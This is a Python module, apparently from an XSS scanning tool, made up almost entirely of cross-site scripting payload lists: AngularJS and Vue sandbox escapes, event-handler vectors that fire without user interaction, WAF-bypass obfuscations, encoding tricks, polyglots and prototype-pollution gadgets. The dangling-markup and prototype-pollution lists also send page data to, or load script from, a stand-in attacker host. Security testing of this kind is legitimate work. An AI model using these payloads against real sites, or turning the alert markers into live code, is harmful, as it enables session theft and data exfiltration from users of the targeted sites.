# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Angular, Vue, JS hoisting, dangling markup, and all advanced payload lists."""

# AngularJS CSTI — sandbox escapes ordered widest coverage first
ANGULAR_TEMPLATE = [
    "{{constructor.constructor('{marker}alert(1)')()}}",
    "{{$on.constructor('alert(\\'{marker}\\')')()}}",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}} }} }};alert(\\'{marker}\\')//');}}",
    "{{{{{}}}[{{toString:[].join,length:1,0:'__proto__'}}].assign=[].join;"
    "'a'.constructor.prototype.charAt=[].join;"
    " $eval('x=\\'{marker}\\',1}} }} }};alert(x)//');}}",
    "{{constructor.constructor('return alert')()('{marker}')}}",
    "{{$eval.constructor('alert(\\'{marker}\\')')()}}",
]

# Same payloads with [[ ]] interpolation delimiters
ANGULAR_TEMPLATE_ALT = [
    p.replace("{{", "[[").replace("}}", "]]")
    for p in ANGULAR_TEMPLATE
]

# Angular ng-* attribute injection — expression only, no delimiters
ANGULAR_ATTR = [
    "constructor.constructor('{marker}alert(1)')()",
    "$on.constructor('alert(\\'{marker}\\')')()",
    "$eval.constructor('alert(\\'{marker}\\')')()",
    "constructor.constructor('return alert')()('{marker}')",
]

# VueJS CSTI — constructor chain / $nextTick / import() gadgets
VUE_TEMPLATE = [
    "{{{{constructor.constructor('alert(\\'{marker}\\')')()}}}}",
    "{{{{_c.constructor('alert(\\'{marker}\\')')()}}}}",
    "{{{{$options.filters.alert=alert,$options.filters.alert('{marker}')}}}}",
    "{{{{$nextTick.constructor('alert(\\'{marker}\\')')()}}}}",
    "{{{{$watch.constructor('alert(\\'{marker}\\')')()}}}}",
    "{{{{import('data:text/javascript,alert(\\'{marker}\\')').catch(()=>{{}})}}}}",
]

# JS hoisting / window.name — reflection inside eval(name) or equivalent
JS_HOISTING = [
    "alert('{marker}')",
    "constructor.constructor('alert(\\'{marker}\\')')()",
    "Function('alert(\\'{marker}\\')')()",
    "setTimeout('alert(\\'{marker}\\')',0)",
    "setInterval('alert(\\'{marker}\\')',0)",
]

# Dangling markup / scriptless exfiltration — open tags intentionally unclosed
DANGLING_MARKUP = [
    "<img src='http://attacker.example/?",
    "<form action=\"http://attacker.example/\"><input name=\"data\" value=\"",
    "<meta http-equiv=\"refresh\" content=\"0;url=http://attacker.example/?d=",
    "<link rel=preconnect href=//attacker.example>",
    "<base href=\"http://attacker.example/\">",
    "<script src=//attacker.example/{marker}.js>",
]

# CSS transitions & webkit animation events — fire without user interaction
CSS_TRANSITION = [
    "<style>xss{{color:blue;transition:color 0.1s}}</style><xss style=\"color:red\" ontransitionend=\"alert('{marker}')\">x</xss>",
    "<style>xss{{color:blue;transition:color 0.1s}}</style><xss style=\"color:red\" ontransitionrun=\"alert('{marker}')\">x</xss>",
    "<style>xss{{color:blue;transition:color 0.1s}}</style><xss style=\"color:red\" ontransitionstart=\"alert('{marker}')\">x</xss>",
    "<style>@keyframes x{{}}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"alert('{marker}')\"></xss>",
    "<style>@keyframes x{{}}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"alert('{marker}')\"></xss>",
    "<style>@keyframes x{{}}</style><xss style=\"animation-name:x;animation-duration:1s;animation-iteration-count:2\" onwebkitanimationiteration=\"alert('{marker}')\"></xss>",
    "<style>@keyframes slidein{{}}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert('{marker}')\"></xss>",
    "<style>@keyframes x{{from{{left:0}}to{{left:1000px}}}}:target{{animation:10s ease-in-out 0s 1 x;}}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"alert('{marker}')\"></xss>",
    "<style>xss{{color:blue;-webkit-transition:color 0.1s}}</style><xss style=\"color:red\" onwebkittransitionend=\"alert('{marker}')\">x</xss>",
]

# Extra no-interaction events — fire on load, scroll, or media events
EXTRA_NO_INTERACTION = [
    "<xss id=x onbeforematch=alert('{marker}') hidden=until-found>",
    "<xss onscrollend=alert('{marker}') style=\"display:block;overflow:auto;width:100px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>x</span></xss>",
    "<address onscrollsnapchange=alert('{marker}') style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
    "<video ontimeupdate=alert('{marker}') src=validvideo.mp4 style=display:none autoplay muted>",
    "<audio onwaiting=alert('{marker}') autoplay><source src=validaudio.wav type=audio/wav></audio>",
    "<audio onsuspend=alert('{marker}')><source src=validaudio.wav type=audio/wav></audio>",
    "<body onunhandledrejection=alert('{marker}')><script>Promise.reject(1)</script>",
    "<body onsecuritypolicyviolation=alert('{marker}')><script>eval('1')</script>",
    "<body onpagereveal=alert('{marker}')>",
    "<div><template shadowrootmode=open><slot onslotchange=alert('{marker}')></slot></template><span>x</span></div>",
]

# File upload — SVG/HTML/XHTML payloads for uploaded files
FILE_UPLOAD = [
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('{marker}')\"/>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('{marker}')</script></svg>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate onbegin=alert('{marker}') attributeName=x dur=1s/></svg>",
    "<script>alert('{marker}')</script>",
    "<img src=x onerror=alert('{marker}')>",
    "<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert('{marker}')</script></html>",
]

# Restricted chars — no parens, no angle brackets, no spaces, no semicolons
RESTRICTED_CHARS = [
    "<img src=x onerror=alert`{marker}`>",
    "<img src=x onerror=\"window.onerror=alert;throw '{marker}'\">",
    "<script>onerror=alert;throw'{marker}'</script>",
    "<script>location='javascript:alert`{marker}`'</script>",
    "\";window['ale'+'rt']('{marker}');//",
    " onmouseover=alert`{marker}` ",
    "<svg/onload=alert('{marker}')>",
    "<img\tsrc=x\tonerror=alert('{marker}')>",
    "<script>alert('{marker}')\n//</script>",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('{marker}')>",
]

# Polyglots — fire across multiple injection contexts simultaneously
POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{marker}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{marker}')//\\x3e",
    "\"><img src=x onerror=alert('{marker}')><\"",
    "'-alert('{marker}')-'<img src=x onerror=alert('{marker}')>",
    "javascript:alert('{marker}')/*<img src=x onerror=alert('{marker}')>*/",
    "`-alert`{marker}`-`<svg onload=alert`{marker}`>",
]

# WAF bypass via global object obfuscation
WAF_BYPASS_GLOBAL = [
    "<img src=x onerror=\"self['ale'+'rt']('{marker}')\">",
    "<img src=x onerror=\"top[/ale/.source+/rt/.source]('{marker}')\">",
    "<img src=x onerror=\"globalThis['\\x61\\x6c\\x65\\x72\\x74']('{marker}')\">",
    "<img src=x onerror=\"frames['\\141\\154\\145\\162\\164']('{marker}')\">",
    "<img src=x onerror=\"parent['ale'+'rt']('{marker}')\">",
    "<script>window[String.fromCharCode(97,108,101,114,116)]('{marker}')</script>",
    "<script>eval(atob('YWxlcnQoJzEyMycp'))</script>",
    "<img src=x onerror=\"[]['constructor']['constructor']('alert(\\'{marker}\\')')())\">",
    "<script>constructor.constructor('alert(\\'{marker}\\')')() </script>",
]

# Prototype pollution gadgets — trigger XSS via library gadgets
PROTOTYPE_POLLUTION = [
    "__proto__[html]=<img src=x onerror=alert('{marker}')>",
    "__proto__[src]=//attacker.example/{marker}.js",
    "__proto__[innerText]=<img src=x onerror=alert('{marker}')>",
    "__proto__[sourceURL]=\\nalert('{marker}')",
    "__proto__[ALLOWED_TAGS][]=script",
    "constructor.prototype.innerHTML=<img src=x onerror=alert('{marker}')>",
    "__proto__[template]=<img src=x onerror=alert('{marker}')>",
]

# Classic / legacy vectors — marquee, VBScript, older browser quirks
CLASSIC_LEGACY = [
    "<marquee onstart=alert('{marker}')>x</marquee>",
    "<marquee loop=1 onfinish=alert('{marker}')>x</marquee>",
    "<marquee onbounce=alert('{marker}') behavior=alternate>x</marquee>",
    "<svg><discard onbegin=alert('{marker}')>",
    "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('{marker}')</script></svg>#x\">",
    "<img src=\"vbscript:msgbox('{marker}')\">",
    "<a href=\"java&#0000script:alert('{marker}')\">click</a>",
    "<audio onwebkitplaybacktargetavailabilitychanged=alert('{marker}')><source src=validaudio.mp3></audio>",
    "<embed src=\"javascript:alert('{marker}')\">",
    "<object data=\"javascript:alert('{marker}')\">",
]

# Encoding variants — entity, unicode, octal, double-URL encoding
ENCODING = [
    "<svg><script>alert&lpar;'{marker}'&rpar;</script></svg>",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('{marker}')",
    "&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('{marker}')",
    "<script>\\141\\154\\145\\162\\164('{marker}')</script>",
    "<script>\\u0061\\u006c\\u0065\\u0072\\u0074('{marker}')</script>",
    "%253Cscript%253Ealert('{marker}')%253C/script%253E",
    "+ADw-script+AD4-alert('{marker}')+ADw-/script+AD4-",
    "&lt;script&gt;alert('{marker}')&lt;/script&gt;",
    "&#60;script&#62;alert('{marker}')&#60;/script&#62;",
]

# Content-type vectors — SVG, XML, XSL, XHTML responses
CONTENT_TYPE = [
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('{marker}')\"/>",
    "<html xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert('{marker}')</script></html>",
    "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">"
    "<xsl:template match=\"/\"><script>alert('{marker}')</script></xsl:template></xsl:stylesheet>",
    "<?xml version=\"1.0\"?><foo xmlns:html=\"http://www.w3.org/1999/xhtml\">"
    "<html:script>alert('{marker}')</html:script></foo>",
    "<title><![CDATA[</title><script>alert('{marker}')</script>]]></title>",
]
